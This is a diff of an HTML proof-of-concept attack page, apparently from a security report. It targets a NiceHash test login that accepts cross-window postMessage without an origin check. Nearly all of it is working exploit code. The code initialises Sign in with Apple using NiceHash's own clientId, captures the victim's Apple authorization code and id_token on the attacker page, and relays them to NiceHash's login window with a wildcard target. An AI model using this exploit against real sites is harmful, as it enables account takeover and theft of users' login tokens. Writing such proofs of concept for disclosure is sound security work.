@@ -1,41 +1,48 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
   <html>
+  <head>
+    <script type="text/javascript"
+  src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
+  </head>
   <body>
-  <button onclick="openTarget()">Step 1: Open NiceHash Login</button>
-  <button onclick="attack()" id="btn2" disabled>Step 2: Send Payload</button>
+  <h2>Sign in with Apple (attacker page)</h2>
+  <div id="appleid-signin" data-color="black" data-border="true" data-type="sign in"></div>
   <pre id="log"></pre>
 
   <script>
   let nhWin = null;
 
-  function openTarget() {
-    nhWin = window.open('https://test.nicehash.com/my/login', 'nhLogin',
-      'width=600,height=700,left=100,top=100');
-    if (!nhWin) { log('POPUP BLOCKED — allow popups for this page'); return; }
-    log('[+] Opened NiceHash login from: ' + window.location.origin);
-    log('[+] Waiting 4s for listener to register...');
-    setTimeout(() => {
-      document.getElementById('btn2').disabled = false;
-      log('[+] Ready — click Step 2');
-    }, 4000);
-  }
+  // Init Apple Sign In using NiceHash's own clientId
+  AppleID.auth.init({
+    clientId: 'com.nicehash.SigninClientID',
+    scope: 'email',
+    redirectURI: 'https://test.nicehash.com/my/login',
+    usePopup: true
+  });
 
-  function attack() {
-    if (!nhWin) { log('[-] No window ref — click Step 1 first'); return; }
-    const payload = {
-      method: 'oauthDone',
-      data: {
-        authorization: {
-          code: 'PASTE_FRESH_CODE_HERE',
-          id_token: 'PASTE_FRESH_ID_TOKEN_HERE',
-          state: 'login'
-        }
-      }
-    };
-    nhWin.postMessage(JSON.stringify(payload), '*');
-    log('[+] postMessage sent from ' + window.location.origin);
-    log('[+] Check NiceHash window → DevTools → Network → apple-callback');
-  }
+  // Listen for Apple's response — delivered HERE because WE opened the popup
+  document.addEventListener('AppleIDSignInOnSuccess', (event) => {
+    const appleData = event.detail;
+    log('[+] Got Apple code: ' + appleData.authorization.code.substring(0, 20) + '...');
+    log('[+] Relaying to NiceHash via postMessage...');
+
+    // Open NiceHash login (or reuse existing window)
+    nhWin = window.open('https://test.nicehash.com/my/login', 'nhLogin',
+      'width=600,height=700');
+
+    setTimeout(() => {
+      // Relay to NiceHash — no origin check = accepted
+      nhWin.postMessage(JSON.stringify({
+        method: 'oauthDone',
+        data: appleData  // real Apple code bound to NiceHash's clientId
+      }), '*');
+      log('[+] postMessage sent — check NiceHash window network tab');
+    }, 4000);
+  });
+
+  document.addEventListener('AppleIDSignInOnFailure', (event) => {
+    log('[-] Apple error: ' + JSON.stringify(event.detail));
+  });
 
   function log(msg) {
     document.getElementById('log').textContent += msg + '\n';
